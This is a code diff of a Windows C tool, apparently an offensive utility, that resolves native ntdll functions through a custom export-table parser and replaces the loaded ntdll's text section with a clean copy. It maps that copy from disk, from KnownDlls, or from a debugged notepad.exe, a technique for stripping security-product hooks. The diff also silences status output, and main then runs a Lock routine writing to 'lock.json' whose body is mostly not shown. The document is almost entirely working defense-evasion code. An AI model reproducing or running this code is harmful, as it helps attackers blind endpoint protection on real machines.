@@ -1,11 +1,6 @@
 #include <stdio.h>
 #include <windows.h>
 
-// Functions
-typedef LONG(WINAPI* RtlGetVersionPtr)(POSVERSIONINFOW);
-
-
-/////////////////////////////////////////////////////////////////////////////////////////////////////////
 #define SECTION_MAP_READ 0x0004
 #define OBJ_CASE_INSENSITIVE 0x00000040
 #define DEBUG_PROCESS 0x00000001
@@ -15,6 +10,8 @@ typedef enum _PROCESSINFOCLASS {
     ProcessBasicInformation = 0,
 } PROCESSINFOCLASS;
 
+
+// Structs
 typedef struct _UNICODE_STRING {
     USHORT Length;
     USHORT MaximumLength;
@@ -30,12 +27,8 @@ typedef struct _OBJECT_ATTRIBUTES {
     PVOID SecurityQualityOfService;
 } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
 
-typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
-typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
-typedef NTSTATUS(WINAPI* NtOpenSectionFn)(HANDLE* SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
-typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE Handle);
 
-
+// Functions
 void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a) {
     p->Length = sizeof(OBJECT_ATTRIBUTES);
     p->RootDirectory = NULL;
@@ -52,26 +45,21 @@ UNICODE_STRING InitUnicodeString(LPCWSTR str) {
     us.MaximumLength = us.Length + sizeof(WCHAR);
     return us;
 }
-/////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+typedef LONG(WINAPI* RtlGetVersionPtr)(POSVERSIONINFOW);
+typedef NTSTATUS(WINAPI* NtQueryInformationProcessFn)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+typedef NTSTATUS(WINAPI* NtReadVirtualMemoryFn)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(WINAPI* NtOpenSectionFn)(HANDLE* SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
+typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE Handle);
+
+RtlGetVersionPtr RtlGetVersion;
+NtQueryInformationProcessFn NtQueryInformationProcess;
+NtReadVirtualMemoryFn NtReadVirtualMemory;
+NtOpenSectionFn NtOpenSection;
+NtCloseFn NtClose;
 
 
-void Lock() {
-    char filename[] = "lock.json";
-
-    ///////////////////////
-    // RtlGetVersion
-    HMODULE hModule = GetModuleHandleW(L"ntdll.dll");
-    if (hModule == NULL) {
-        printf("Error: Cannot get handle to ntdll.dll\n");
-        return;
-    }
-    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hModule, "RtlGetVersion");
-    if (RtlGetVersion == NULL) {
-        printf("Error: Cannot get address of RtlGetVersion\n");
-        return;
-    }
-    ///////////////////////
-
+void Lock(const char* filename) {
     OSVERSIONINFOW osvi = { 0 };
     osvi.dwOSVersionInfoSize = sizeof(osvi);
     if (RtlGetVersion(&osvi) == 0) {
@@ -195,20 +183,6 @@ int* GetTextSectionInfo(LPVOID ntdll_address) {
 
 // Read remote IntPtr (8-bytes)
 PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
-    ///////////////////
-    // Load NtQueryInformationProcess from Ntdll.dll
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (hNtdll == NULL) {
-        printf("[-] Error loading ntdll.dll.\n");
-        return NULL;
-    }
-    NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
-    if (!NtReadVirtualMemory) {
-        printf("[-] Error getting NtReadVirtualMemory function address.\n");
-        return NULL;
-    }
-    ///////////////////
-
     BYTE buff[8];
     SIZE_T bytesRead;
     NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);
@@ -224,20 +198,6 @@ PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
 
 // Read remote Unicode string
 char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
-    ///////////////////
-    // Load NtQueryInformationProcess from Ntdll.dll
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (hNtdll == NULL) {
-        printf("[-] Error loading ntdll.dll.\n");
-        return NULL;
-    }
-    NtReadVirtualMemoryFn NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress(hNtdll, "NtReadVirtualMemory");
-    if (!NtReadVirtualMemory) {
-        printf("[-] Error getting NtReadVirtualMemory function address.\n");
-        return NULL;
-    }
-    ///////////////////
-
     BYTE buff[256];
     SIZE_T bytesRead;
     NTSTATUS ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, sizeof(buff), &bytesRead);
@@ -276,20 +236,6 @@ LPVOID GetModuleAddress(const char* dll_name) {
 
     BYTE pbi_byte_array[48];
     void* pbi_addr = (void*)pbi_byte_array;
-
-    ////////////////////////////////
-    // NtQueryInformationProcess
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) {
-        printf("[-] Error loading ntdll.dll.\n");
-        return NULL;
-    }
-    NtQueryInformationProcessFn NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
-    if (!NtQueryInformationProcess) {
-        printf("[-] Error getting NtQueryInformationProcess function address.\n");
-        return NULL;
-    }
-    ////////////////////////////////
 
     ULONG ReturnLength;
     HANDLE hProcess = GetCurrentProcess();
@@ -367,18 +313,6 @@ LPVOID MapNtdllFromDisk(const char* ntdll_path) {
 
 
 LPVOID MapNtdllFromKnownDlls() {
-    ///////////////////
-    // Load NtQueryInformationProcess from Ntdll.dll
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (hNtdll == NULL) {
-        printf("[-] Error loading ntdll.dll.\n");
-        return NULL;
-    }
-    NtOpenSectionFn NtOpenSection = (NtOpenSectionFn)GetProcAddress(hNtdll, "NtOpenSection");
-    NtCloseFn NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");
-
-    ///////////////////
-
     LPCWSTR dll_name = L"\\KnownDlls\\ntdll.dll";
 
     if (sizeof(void*) == 4) {
@@ -476,25 +410,28 @@ LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
 }
 
 
-void ReplaceLibrary(const char* option, const char* wildcard_field){
+void ReplaceLibrary(const char* option){
     const int offset_mappeddll = 4096;
     long long unhookedNtdllTxt = 0;
 
     if (strcmp(option, "disk") == 0) {
-        printf("[+] Option: Disk\n");
+        // printf("[+] Option: Disk\n");
         const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
         LPVOID unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
         unhookedNtdllTxt = (long long)unhookedNtdllHandle + offset_mappeddll;
     }
     else if (strcmp(option, "knowndlls") == 0) {
-        printf("[+] Option: Knowndlls\n");
+        // printf("[+] Option: Knowndlls\n");
         LPVOID unhookedNtdllHandle = MapNtdllFromKnownDlls();
         unhookedNtdllTxt = (long long)unhookedNtdllHandle + offset_mappeddll;
     }
     else if (strcmp(option, "debugproc") == 0) {
-        printf("[+] Option: Debugproc\n");
+        // printf("[+] Option: Debugproc\n");
         const char* proc_path = "c:\\Windows\\System32\\notepad.exe";
         unhookedNtdllTxt = (long long)MapNtdllFromDebugProc(proc_path);
+    }
+    else {
+        return;
     }
 
     const char* targetDll = "ntdll.dll";
@@ -510,16 +447,92 @@ void ReplaceLibrary(const char* option, const char* wildcard_field){
 /////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 
+void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
+    // Offsets for 32-bit and 64-bit processes
+    int exportrva_offset = 136; // 64-bit
+    // Get current process handle
+    HANDLE hProcess = GetCurrentProcess();
+    // DOS header (IMAGE_DOS_HEADER)->e_lfanew
+    DWORD e_lfanew_value = 0;
+    SIZE_T aux = 0;
+    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + 0x3C, &e_lfanew_value, sizeof(e_lfanew_value), &aux);
+    // printf("[*] e_lfanew: \t\t\t\t\t0x%X\n", e_lfanew_value);
+    // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
+    WORD sizeopthdr_value = 0;
+    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + 20, &sizeopthdr_value, sizeof(sizeopthdr_value), &aux);
+    // printf("[*] SizeOfOptionalHeader: \t\t\t0x%X\n", sizeopthdr_value);
+    // Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
+    DWORD exportTableRVA_value = 0;
+    NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + e_lfanew_value + exportrva_offset, &exportTableRVA_value, sizeof(exportTableRVA_value), &aux);
+    // printf("[*] exportTableRVA address: \t\t\t0x%X\n", exportTableRVA_value);
+    if (exportTableRVA_value != 0) {
+        // Read NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
+        DWORD numberOfNames_value = 0;
+        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x18, &numberOfNames_value, sizeof(numberOfNames_value), &aux);
+        // printf("[*] numberOfNames: \t\t\t\t0x%X\n", numberOfNames_value);
+        // Read AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
+        DWORD addressOfFunctionsVRA_value = 0;
+        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x1C, &addressOfFunctionsVRA_value, sizeof(addressOfFunctionsVRA_value), &aux);
+        // printf("[*] addressOfFunctionsVRA: \t\t\t0x%X\n", addressOfFunctionsVRA_value);
+        // Read AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
+        DWORD addressOfNamesVRA_value = 0;
+        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x20, &addressOfNamesVRA_value, sizeof(addressOfNamesVRA_value), &aux);
+        // printf("[*] addressOfNamesVRA: \t\t\t\t0x%X\n", addressOfNamesVRA_value);
+        // Read AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
+        DWORD addressOfNameOrdinalsVRA_value = 0;
+        NtReadVirtualMemory(hProcess, (BYTE*)pDosHdr + exportTableRVA_value + 0x24, &addressOfNameOrdinalsVRA_value, sizeof(addressOfNameOrdinalsVRA_value), &aux);
+        // printf("[*] addressOfNameOrdinalsVRA: \t\t\t0x%X\n", addressOfNameOrdinalsVRA_value);
+        void* addressOfFunctionsRA = (BYTE*)pDosHdr + addressOfFunctionsVRA_value;
+        void* addressOfNamesRA = (BYTE*)pDosHdr + addressOfNamesVRA_value;
+        void* addressOfNameOrdinalsRA = (BYTE*)pDosHdr + addressOfNameOrdinalsVRA_value;
+        for (int i = 0; i < numberOfNames_value; i++) {
+            DWORD functionAddressVRA = 0;
+            NtReadVirtualMemory(hProcess, addressOfNamesRA, &functionAddressVRA, sizeof(functionAddressVRA), &aux);
+            void* functionAddressRA = (BYTE*)pDosHdr + functionAddressVRA;
+            char functionName[256];
+            NtReadVirtualMemory(hProcess, functionAddressRA, functionName, strlen(func_name) + 1, &aux);
+            if (strcmp(functionName, func_name) == 0) {
+                WORD ordinal = 0;
+                NtReadVirtualMemory(hProcess, addressOfNameOrdinalsRA, &ordinal, sizeof(ordinal), &aux);
+                // printf("[+] Ordinal: %d\n", ordinal);
+                void* functionAddress;
+                NtReadVirtualMemory(hProcess, (BYTE*)addressOfFunctionsRA + ordinal * 4, &functionAddress, sizeof(functionAddress), &aux);
+                // printf("[+] functionAddress: \t\t\t\t0x%p\n", functionAddress);
+                uintptr_t maskedFunctionAddress = (uintptr_t)functionAddress & 0xFFFFFFFF;
+                return (BYTE*)pDosHdr + (DWORD_PTR)maskedFunctionAddress;
+            }
+            addressOfNamesRA = (BYTE*)addressOfNamesRA + 4;
+            addressOfNameOrdinalsRA = (BYTE*)addressOfNameOrdinalsRA + 2;
+        }
+    }
+    return NULL;
+}
+
+
+void initializeFunctions() {
+    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
+    NtQueryInformationProcess = (NtQueryInformationProcessFn)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+    NtReadVirtualMemory = (NtReadVirtualMemoryFn)GetProcAddress((HMODULE)hNtdll, "NtReadVirtualMemory");
+
+    RtlGetVersion = (RtlGetVersionPtr)CustomGetProcAddress(hNtdll, "RtlGetVersion");
+    NtClose = (NtCloseFn)CustomGetProcAddress(hNtdll, "NtClose");
+    NtOpenSection = (NtOpenSectionFn)CustomGetProcAddress(hNtdll, "NtOpenSection");
+}
+
+
 int main(int argc, char* argv[]) {
+    initializeFunctions();
+
     // Replace ntdll library
     const char* ntdll_option = "default";
-    if (argc >= 1)
+    if (argc >= 2)
     {
         ntdll_option = argv[1];
     }
-    ReplaceLibrary(ntdll_option, "");
- 
-    Lock();
+    ReplaceLibrary(ntdll_option);
+    
+    const char* filename = "lock.json";
+    Lock(filename);
 
     return 0;
 }
